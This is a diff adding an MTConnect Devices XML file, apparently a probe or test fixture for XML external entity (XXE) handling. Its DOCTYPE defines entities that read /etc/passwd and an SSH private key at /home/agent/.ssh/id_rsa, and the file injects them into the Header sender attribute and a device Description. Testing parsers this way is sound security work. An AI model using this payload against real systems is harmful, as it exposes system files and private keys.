@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE MTConnectDevices [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+  <!ENTITY key SYSTEM "file:///home/agent/.ssh/id_rsa">
+]>
+<MTConnectDevices xmlns="urn:mtconnect.org:MTConnectDevices:2.7">
+  <Header creationTime="2026-07-27T10:00:00Z" sender="&key;" instanceId="1749000000" version="2.7.0.12" bufferSize="131072"/>
+  <Devices>
+    <Device id="xxe" name="XXE-PROBE" uuid="XXE.1">
+      <Description manufacturer="attacker">&xxe;</Description>
+      <DataItems>
+        <DataItem category="EVENT" id="avail" name="avail" type="AVAILABILITY"/>
+      </DataItems>
+    </Device>
+  </Devices>
+</MTConnectDevices>
